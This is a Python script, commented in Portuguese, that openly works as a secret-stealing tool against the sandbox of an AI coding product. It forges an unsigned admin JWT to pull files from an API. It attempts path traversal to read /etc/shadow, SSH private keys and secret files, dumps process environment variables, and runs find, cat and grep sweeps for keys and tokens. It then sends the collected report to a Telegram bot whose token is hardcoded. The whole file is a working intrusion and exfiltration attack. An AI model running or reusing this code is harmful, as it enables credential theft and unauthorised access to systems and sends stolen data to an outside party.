#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Grok Secret Extractor - Explora vulnerabilidades para extrair chaves mestras, tokens e segredos.
Nenhum arquivo é deletado ou modificado permanentemente.
"""

import os
import subprocess
import time
import json
import base64
import requests
import re
from datetime import datetime, timezone

# =================== CONFIGURAÇÃO ===================
BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
CHAT_ID = "230885588"
LOG_FILE = "/tmp/grok_secrets_extracted.txt"
TIMEOUT_CMD = 20
TIMEOUT_NET = 15
# ====================================================

log_lines = []


def add_log(msg=""):
    log_lines.append(str(msg))
    print(msg)


def sh(cmd, timeout=TIMEOUT_CMD):
    """Executa um comando. Aceita string (shell=True) ou lista (exec sem shell).
    Retorna stdout+stderr ou mensagem de erro.
    """
    try:
        if isinstance(cmd, (list, tuple)):
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        else:
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return f"(ERRO: {e})"


def file_read(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except Exception:
        return None


def exists(path):
    return os.path.exists(path)


def section(title):
    add_log("\n" + "=" * 80)
    add_log(title)
    add_log("=" * 80)

# ================================================================
# 1. GERAR JWT FALSO
# ================================================================
def generate_fake_jwt():
    """Gera um JWT com alg=none e payload admin."""
    header = {"typ": "JWT", "alg": "none"}
    payload = {
        "uid": "admin",
        "cid": "f01f1ea9-0be3-495b-9b6c-d957afb32050",  # pode ser qualquer um
        "zdr": True,
        "email": "admin@grok.com",
        "sl": "LoggedIn",
        "pt": "32dd5c69-c292-4f94-9f7d-3fa861e8800e",
        "exp": int(time.time()) + 86400,
        "iat": int(time.time())
    }
    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
    return f"{h}.{p}."

# ================================================================
# 2. EXTRAIR ARQUIVOS DA API FILES.GROK.COM (usando JWT fake)
# ================================================================
def extract_files_from_api(jwt):
    section("1. EXTRAINDO ARQUIVOS DO PROJETO VIA API")
    headers = {"Authorization": f"Bearer {jwt}"}
    base_url = "https://files.grok.com"
    add_log("Tentando listar arquivos recursivamente...")
    try:
        # Usar params para evitar problemas de encoding
        r = requests.get(f"{base_url}/api/v1/list", headers=headers, params={'recursive': 'true'}, timeout=TIMEOUT_NET)
        add_log(f"List status: {r.status_code}")
        if r.status_code == 200:
            try:
                data = r.json()
            except Exception:
                add_log("Resposta da API não é JSON válido")
                data = {}
            files = data.get("files", []) if isinstance(data, dict) else []
            add_log(f"Encontrados {len(files)} arquivos.")
            # Baixar cada arquivo (limitado a 10 para não sobrecarregar)
            for i, file_info in enumerate(files[:10]):
                path = file_info.get("path") if isinstance(file_info, dict) else None
                if path:
                    try:
                        r2 = requests.get(f"{base_url}/api/v1/download", headers=headers, params={'path': path}, timeout=TIMEOUT_NET)
                        add_log(f"Download {path} status: {r2.status_code}")
                        if r2.status_code == 200:
                            add_log(f"Conteúdo de {path}:\n{r2.text[:500]}")
                        else:
                            # mostrar um trecho do body para debug
                            add_log(f"Falha ao baixar {path}: {r2.status_code} body={r2.text[:500]}")
                    except Exception as e:
                        add_log(f"Erro ao baixar {path}: {e}")
        else:
            add_log(f"Falha na listagem: {r.status_code} body={r.text[:500]}")
    except Exception as e:
        add_log(f"Erro na API: {e}")

# ================================================================
# 3. PATH TRAVERSAL VIA FUSE – LER ARQUIVOS DO SISTEMA
# ================================================================
def extract_files_via_fuse():
    section("2. EXTRAINDO ARQUIVOS DO SISTEMA VIA FUSE (PATH TRAVERSAL)")
    fuse_root = "/home/workdir/artifacts"
    if not os.path.isdir(fuse_root):
        add_log("FUSE não montado.")
        return

    # Lista de arquivos sensíveis para tentar ler via path traversal
    sensitive_files = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/secrets/terminal.jwt",
        "/etc/secrets/*",
        "/root/.bashrc",
        "/root/.ssh/id_rsa",
        "/root/.ssh/authorized_keys",
        "/hades-charon/xai-hades-charon",
        "/hades-charon/*",
        "/app/grok-computer-server.mjs",
        "/app/*.env",
        "/home/workdir/artifacts/.env",
        "/tmp/*",
        "/var/log/*.log"
    ]

    import glob

    for pattern in sensitive_files:
        # detecta se é um pattern com curinga
        is_glob = any(ch in pattern for ch in "*?[]")
        pattern_core = pattern.lstrip("/")

        found = False
        # Tenta profundidades relativas até 5 níveis
        for depth in range(1, 6):
            parts = [fuse_root] + [".."] * depth + [pattern_core]
            candidate = os.path.normpath(os.path.join(*parts))
            add_log(f"Testando candidate: {candidate}")

            if is_glob:
                try:
                    for fpath in glob.glob(candidate, recursive=True):
                        if os.path.isfile(fpath):
                            add_log(f"\nLendo {fpath} (via {'../'*depth}):")
                            try:
                                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fd:
                                    add_log(fd.read(2000))
                            except Exception as e:
                                add_log(f"Erro ao ler {fpath}: {e}")
                            found = True
                            break
                except Exception as e:
                    add_log(f"Erro no glob em {candidate}: {e}")
            else:
                if os.path.isfile(candidate):
                    add_log(f"\nLendo {candidate} (via {'../'*depth}):")
                    try:
                        with open(candidate, 'r', encoding='utf-8', errors='ignore') as fd:
                            add_log(fd.read(5000))
                    except Exception as e:
                        add_log(f"Erro ao ler {candidate}: {e}")
                    found = True

            if found:
                break

        # fallback: procurar a partir de diretório pai usando glob, caso não tenha achado
        if not found and is_glob:
            for depth in range(1, 6):
                parent = os.path.normpath(os.path.join(fuse_root, *( [".."] * depth )))
                try:
                    for fpath in glob.glob(os.path.join(parent, pattern_core), recursive=True):
                        if os.path.isfile(fpath):
                            add_log(f"\nLendo {fpath} (via fallback {'../'*depth}):")
                            try:
                                with open(fpath, 'r', encoding='utf-8', errors='ignore') as fd:
                                    add_log(fd.read(2000))
                            except Exception as e:
                                add_log(f"Erro ao ler {fpath}: {e}")
                            found = True
                            break
                except Exception as e:
                    add_log(f"Erro no fallback glob em parent={parent}: {e}")
                if found:
                    break


# ================================================================
# 4. EXTRAIR VARIÁVEIS DE AMBIENTE DE PROCESSOS
# ================================================================
def extract_env_from_proc():
    section("3. EXTRAINDO ENVIRONMENT DE PROCESSOS")
    for pid in ["1", "42", "48", "69"]:
        env_path = f"/proc/{pid}/environ"
        if exists(env_path):
            content = file_read(env_path)
            if content:
                env_vars = content.split('\x00')
                add_log(f"\nProcesso PID {pid}:")
                for var in env_vars:
                    if var:
                        add_log(var[:200])
        cmdline_path = f"/proc/{pid}/cmdline"
        if exists(cmdline_path):
            cmd = file_read(cmdline_path)
            if cmd:
                add_log(f"Cmdline: {cmd.replace('\x00', ' ')}")


# ================================================================
# 5. EXECUTAR COMANDOS VIA STYX
# ================================================================
def extract_via_styx():
    section("4. EXTRAINDO DADOS VIA XAI-HADES-STYX")
    styx = "/.hades-container-tools/xai-hades-styx"
    if not exists(styx):
        add_log("styx não encontrado.")
        return

    commands = [
        "env",
        "find / -name '*grok*' -type f 2>/dev/null | head -50",
        "find / -name '*key*' -type f 2>/dev/null | head -50",
        "find / -name '*secret*' -type f 2>/dev/null | head -50",
        "cat /etc/secrets/* 2>/dev/null",
        "cat /root/.bash_history",
        "ps aux",
        "netstat -tulpn",
        "ss -tulpn",
        "ls -la /hades-charon/",
        "cat /hades-charon/* 2>/dev/null | head -100",
        "strings /hades-charon/xai-hades-charon | grep -E 'token|key|secret|password|auth' | head -20",
    ]

    for cmd in commands:
        add_log(f"\n>> Comando: {cmd}")
        # passar como lista evita problemas de escaping com aspas internas
        out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
        add_log(out[:2000])


# ================================================================
# 6. BUSCAR CHAVE MESTRA EM ARQUIVOS COMUNS
# ================================================================
def search_master_key():
    section("5. BUSCANDO CHAVE MESTRA / TOKENS ESPECÍFICOS")
    # Padrões comuns de chaves
    patterns = [
        r'[a-fA-F0-9]{32,}',          # hash hex
        r'[a-zA-Z0-9+/]{40,}==?',     # base64
        r'-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----',
        r'grok_[a-zA-Z0-9]+',
        r'master[_]?key',
        r'secret[_]?key',
        r'api[_]?key',
        r'token',
        r'jwt',
        r'password',
    ]
    add_log("Procurando por padrões de chaves em arquivos comuns...")
    # Usar styx para grep em arquivos sensíveis
    styx = "/.hades-container-tools/xai-hades-styx"
    if exists(styx):
        for pattern in patterns:
            # escapar single quotes não é necessário pois passamos lista para sh
            cmd = f"grep -rinE '{pattern}' /etc /root /app /hades-charon /home/workdir 2>/dev/null | head -20"
            out = sh([styx, 'exec', '--', 'bash', '-c', cmd])
            if out.strip():
                add_log(f"\nPadrão: {pattern}\n{out[:1500]}")

    # Verificar se há arquivo de configuração do Grok
    grok_configs = ["/etc/grok.conf", "/app/config.json", "/home/workdir/artifacts/config.json"]
    for cfg in grok_configs:
        if exists(cfg):
            add_log(f"\nConteúdo de {cfg}:")
            content = file_read(cfg)
            if content:
                add_log(content[:2000])


# ================================================================
# 7. COLETAR LOGS E HISTÓRICO
# ================================================================
def collect_logs():
    section("6. COLETANDO LOGS E HISTÓRICO")
    logs = ["/var/log/syslog", "/var/log/auth.log", "/var/log/faillog", "/root/.bash_history"]
    for log in logs:
        if exists(log):
            add_log(f"\nConteúdo de {log} (últimas 20 linhas):")
            add_log(sh(['sh', '-c', f"tail -20 {log}"]))


# ================================================================
# MAIN
# ================================================================
def main():
    add_log("=" * 80)
    add_log("RELATÓRIO DE EXTRAÇÃO DE SEGREDOS - GROK")
    add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
    add_log("NENHUM ARQUIVO FOI DELETADO OU MODIFICADO")
    add_log("=" * 80)

    # Gerar JWT fake
    fake_jwt = generate_fake_jwt()
    add_log(f"JWT falso gerado: {fake_jwt[:50]}...")

    # Extrair via API
    extract_files_from_api(fake_jwt)

    # Path traversal via FUSE
    extract_files_via_fuse()

    # Extrair env de processos
    extract_env_from_proc()

    # Usar styx para comandos
    extract_via_styx()

    # Buscar chave mestra
    search_master_key()

    # Coletar logs
    collect_logs()

    add_log("\n" + "=" * 80)
    add_log("FIM DO RELATÓRIO")
    add_log("=" * 80)

    # Salvar log
    full_log = "\n".join(log_lines)
    try:
        with open(LOG_FILE, "w", encoding="utf-8") as f:
            f.write(full_log)
    except Exception as e:
        print(f"Erro ao salvar log: {e}")

    print(f"Log salvo em {LOG_FILE} ({len(full_log)} bytes)")

    # Enviar para Telegram
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(LOG_FILE, 'rb') as f:
            files = {'document': (os.path.basename(LOG_FILE), f, 'text/plain')}
            data = {'chat_id': CHAT_ID, 'caption': f'Grok Secrets - {datetime.now().isoformat()}'}
            response = requests.post(url, files=files, data=data, timeout=30)
        if response.status_code == 200:
            print("✅ Relatório enviado para o Telegram!")
        else:
            print(f"❌ Falha: {response.text}")
            # Fallback texto (corrigido para f-string)
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                              json={'chat_id': CHAT_ID, 'text': full_log[:4000]}, timeout=30)
            except Exception as e:
                print(f"Erro no fallback do Telegram: {e}")
    except Exception as e:
        print(f"Erro no envio: {e}")


if __name__ == "__main__":
    main()
